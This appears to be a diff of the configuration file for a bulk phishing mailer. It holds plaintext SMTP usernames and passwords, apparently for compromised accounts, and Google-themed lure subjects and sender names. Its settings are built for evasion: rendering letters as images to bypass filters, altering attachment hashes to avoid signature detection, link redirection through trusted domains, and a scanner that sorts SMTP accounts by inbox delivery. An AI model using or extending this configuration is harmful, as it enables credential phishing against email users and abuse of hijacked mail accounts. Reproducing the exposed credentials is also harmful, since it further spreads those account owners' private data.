@@ -4,17 +4,16 @@
  * SECTION 1: SMTP & CLOUD API CREDENTIALS
  */
 const smtp = [
- {
-    "host": "smtp.gmail.com", // The SMTP server address
-    "port": 587, // Port number (usually 587 for TLS or 465 for SSL)
-    "secure": false, // Set to true for SSL (port 465), false for TLS/STARTTLS
-    "username": "madnan2173ilove@gmail.com", // SMTP login username/email
-    "password": "tcax tngm zaib lqzy", // SMTP password or App Password
-    "from_email": "madnan2173ilove@gmail.com", // The email address that appears as the sender
+  {
+    "host": "smtp.bizmail.yahoo.com",
+    "port": 587,
+    "secure": false,
+    "username": "darlene@finehomesusa.com",
+    "password": "cvvpexoxkdeqlshz",
+    "from_email": "darlene@finehomesusa.com",
     
-    "tested": "2026-02-13T13:30:24.530Z", // Last successful internal test timestamp
-    "tested_at": "2026-03-16T13:04:20.815Z" // Last verification attempt timestamp
-  },
+  }
+  
 ];
 
 /**
@@ -36,8 +35,8 @@ const setup = {
   key: "key", // License key for script authorization
   MultipleSmtp: "ROTATE", // Use 'ROTATE' to switch accounts or 'SINGLE' for one
   mail_priority: "HIGH", // Email header priority (HIGH, NORMAL, LOW)
-  sleep_time: 3, // Delay in seconds between sending attempts
-  sleep_after_count: 5, // Pause the script after sending this many emails
+  sleep_time: 30, // Delay in seconds between sending attempts
+  sleep_after_count: 10, // Pause the script after sending this many emails
   isMultiThread: false, // Enable multi-threading for significantly faster delivery
   howManyThread: 10, // Number of simultaneous worker threads to spawn
   
@@ -47,34 +46,18 @@ const setup = {
 
   // --- CONTENT DECEPTION & RENDERING ---
   LetterToImage: false, // Convert HTML email body into an image to bypass filters
-  fileName_LetterToImage: "./letterToImage.html", // Default HTML source file for image rendering
-  
-  // NEW: MULTIPLE IMAGE TEMPLATES (For LetterToImage)
-  use_multiple_images: false, // Enable rotation of HTML templates for image rendering
-  multi_images: [ // List of HTML files to rotate for the image conversion process
-    "./letterToImage1.html",
-    "./letterToImage2.html"
-  ],
-
+  fileName_LetterToImage: "./letterToImage.html", // HTML source file for image rendering
   width_imageLetter: 800, // Resolution width of the rendered browser window
   height_imageLetter: 1000, // Resolution height of the rendered browser window
   width_imageLetter_2: "100%", // Display width of the rendered image in the email
   height_imageLetter_2: "auto", // Display height of the rendered image in the email
-  
+  use_multiple_letters: false, // Randomly pick from a list of HTML templates
   letter: "letter.html", // Default HTML template file
-  
-  // NEW: MULTIPLE LETTER TEMPLATES
-  use_multiple_letters: false, // Enable rotation of email body HTML templates
-  multi_letters: [ // List of HTML email templates to rotate randomly
-    "letter1.html",
-    "letter2.html",
-    "letter3.html"
-  ],
   
   // --- SENDER & SUBJECT ROTATION ---
   use_noreply: false, // Override sender to show a randomized "noreply@domain" address
   from_name: "<RANDNUM5>", // Default sender name (supports random macros)
-  mail_subject: "<RANDNUM4>", // Default email subject (supports random macros)
+ mail_subject: "<COMPANYNAME> <RANDNUM4>", // Default email subject (supports random macros)
 
   multiple_fromName: true, // Enable rotation of sender names
   multi_FromName: [ // List of sender names to rotate randomly
@@ -84,7 +67,7 @@ const setup = {
     "Google Account Services",
     "Account Notification"
   ],
- multiple_subject: true, // Enable rotation of email subjects
+ multiple_subject: false, // Enable rotation of email subjects
   multi_subject: [ // List of subjects to rotate randomly
     "Your Gmail will stop working in 2 days",
     "Action Required: Your Google Storage is Full (15 GB)",
@@ -114,7 +97,7 @@ const setup = {
   mailist: "mailist.txt", // The file containing your target recipient list
   
   // --- ASSETS & BRANDING ---
-  useAttachment: true, // Enable file attachments
+  useAttachment: false, // Enable file attachments
   useGrabLogo: false, // Automatically fetch the logo of the recipient's company
   logoWidth: "450px", // CSS width for the grabbed logo
   logoMaxWidth: "500px", // CSS max-width for the grabbed logo
@@ -122,6 +105,16 @@ const setup = {
   defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31", // Fallback logo URL
   useMylogo: false, // Use your custom fixed logo from the myLOGO section
   proxy: "" // SOCKS5 proxy URL (e.g., socks5://user:pass@host:port)
+};
+
+const intelligence_suite = {
+  // 1. SMTP Health Scanner (SMTP + IMAP Bounce Check)
+  run_smtp_scanner: false, 
+  smtp_source_file: "smtpm.json",    // Raw SMTP input list
+  smtp_result_file: "activesmtp.json", // Output file for successful & non-bouncing SMTPs
+  save_working_only: true,          // Only save accounts that successfully reach the inbox
+  bounce_wait_time: 10,             // Delay to wait for bounce notifications (seconds)
+  test_to: "asd@asd.com",           // Target email for inbox verification
 };
 
 /**
@@ -137,18 +130,7 @@ const mailbox_extractor = {
   search_depth_days: 30 // Look back this many days in the mailbox
 };
 
-// NEW FEATURE: Advanced Open Redirect Scanner
-const open_redirect_scanner = {
-  active: false, // Enable open-redirect URL generator to hide target links
-  provider_list: [ // List of trusted domains used for redirection
-    "https://google.com/url?q=",
-    "https://linkedin.com/redir/redirect?url=",
-    "https://facebook.com/l.php?u="
-  ],
-  use_auto_scan: false, // Automatically verify if redirect providers are still working
-  obfuscation_level: "HIGH" // Encoding intensity for links to dodge security scanners
-};
-
+// NEW FEATURE: Calendar Invite Module
 const calendar_invite = {
   active: false, // Enable sending calendar invites to appear in user's schedules
   TIMEZONE: "America/Adak", // Timezone for the event
@@ -185,7 +167,6 @@ const attachment = [
     injectBinaryNoise: true // Modifies file hash on every send to prevent signature detection
   }
 ];
-
 
 const generate_QRCODE = {
   activate: false, // Generate a unique QR code in the email
@@ -242,5 +223,5 @@ module.exports = {
   calendar_invite,
   redirect_link: { useRedirect: false, key: "tes1", enc_email: "c" }, // Settings for legacy redirect module
   mailbox_extractor,
-  open_redirect_scanner 
+  intelligence_suite,
 };
